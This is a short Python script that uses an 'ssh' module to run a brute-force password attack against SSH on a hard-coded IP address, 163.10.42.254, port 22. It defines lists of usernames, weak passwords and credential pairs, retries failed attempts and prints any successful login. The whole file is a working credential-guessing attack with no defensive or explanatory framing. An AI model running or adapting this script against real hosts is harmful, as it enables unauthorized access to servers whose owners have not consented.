import ssh

d1 = {'usernames':['cacho', 'rojo', 'hacker'],
     'passwords':['1234', '12345', '123456', '111112', 'hacker', '54321', '654321'],
     'pairs':[('cacho', 'admin'), ('cacho', '111111')]}

d2 = {'usernames':[],
      'passwords':[],
      'pairs':[('admin', 'admin'), ('admin', 'hacker2'), ('admin', '111111')]}

def success_callback(username, password):
    print('[!] Login! username: {0} - password: {1}'.format(username, password))

def retry_callback(attempt):
    print('[!] Retry - Attempt {0}'.format(attempt))
    if(attempt < 3):
        return True
    return False

c = ssh.SSH(success_callback, retry_callback, "163.10.42.254", 22)

c.crack(**d1)
